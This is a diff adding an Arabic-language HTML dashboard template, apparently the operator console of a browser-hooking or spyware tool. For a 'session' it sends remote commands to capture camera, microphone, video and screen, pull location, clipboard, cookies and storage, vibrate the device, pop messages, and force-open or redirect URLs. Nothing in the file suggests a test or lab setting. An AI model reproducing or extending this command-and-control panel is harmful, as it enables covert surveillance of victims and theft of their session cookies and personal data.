@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LSH Session</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+<style>
+  body { background:#0b1120; color:#e2e8f0; font-family:system-ui,sans-serif; }
+  .card-dark { background:#1e293b; border:1px solid #334155; border-radius:14px; padding:20px; margin-bottom:16px; }
+  .cmd-btn {
+    background:linear-gradient(135deg,#1e293b,#0f172a);
+    border:1px solid #334155;
+    border-radius:10px;
+    padding:14px;
+    color:#e2e8f0;
+    cursor:pointer;
+    transition:all 0.2s;
+    text-align:center;
+    font-size:13px;
+  }
+  .cmd-btn:hover { border-color:#3b82f6; transform:translateY(-2px); }
+  .cmd-btn i { font-size:22px; display:block; margin-bottom:6px; color:#3b82f6; }
+</style>
+</head>
+<body>
+
+<div class="container py-4" style="max-width:1000px">
+  <a href="/dashboard/" class="btn btn-sm btn-outline-secondary mb-3">
+    <i class="bi bi-arrow-right"></i> رجوع
+  </a>
+  
+  <div class="card-dark">
+    <h5><i class="bi bi-broadcast text-info"></i> LSH Session</h5>
+    <code style="color:#60a5fa">{{ session_id }}</code>
+  </div>
+  
+  <div class="card-dark">
+    <h6 class="mb-3">📸 الوسائط</h6>
+    <div class="row g-2">
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('snapshot')">
+          <i class="bi bi-camera-fill"></i> صورة
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('audio', {duration:6000})">
+          <i class="bi bi-mic-fill"></i> صوت
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('video', {duration:10000})">
+          <i class="bi bi-camera-video-fill"></i> فيديو
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('screen')">
+          <i class="bi bi-display"></i> شاشة
+        </button>
+      </div>
+    </div>
+  </div>
+  
+  <div class="card-dark">
+    <h6 class="mb-3">📍 البيانات</h6>
+    <div class="row g-2">
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('location')">
+          <i class="bi bi-geo-alt-fill"></i> موقع
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('clipboard')">
+          <i class="bi bi-clipboard-fill"></i> حافظة
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('cookies')">
+          <i class="bi bi-shield-lock"></i> كوكيز
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('storage')">
+          <i class="bi bi-hdd-fill"></i> تخزين
+        </button>
+      </div>
+    </div>
+  </div>
+  
+  <div class="card-dark">
+    <h6 class="mb-3">🎮 التحكم</h6>
+    <div class="row g-2">
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('vibrate', {pattern:[500,200,500]})">
+          <i class="bi bi-phone-vibrate-fill"></i> اهتزاز
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('toast', {text:'رسالة من الإدارة'})">
+          <i class="bi bi-chat-square-text-fill"></i> Toast
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('url', {url: prompt('الرابط:')})">
+          <i class="bi bi-link-45deg"></i> فتح رابط
+        </button>
+      </div>
+      <div class="col-6 col-md-3">
+        <button class="cmd-btn w-100" onclick="sendCmd('redirect', {url:'about:blank'})">
+          <i class="bi bi-x-circle"></i> إغلاق
+        </button>
+      </div>
+    </div>
+  </div>
+  
+</div>
+
+<script>
+const SESSION_ID = "{{ session_id }}";
+
+async function sendCmd(action, payload = {}) {
+  if (!action) return;
+  if (payload.url === null) return;  // user cancelled prompt
+  
+  try {
+    const r = await fetch(`/dashboard/api/lsh/${SESSION_ID}/command`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action, payload })
+    });
+    const d = await r.json();
+    alert(d.ok ? '✅ تم الإرسال' : '❌ فشل');
+  } catch(e) {
+    alert('❌ خطأ');
+  }
+}
+</script>
+
+</body>
+</html>
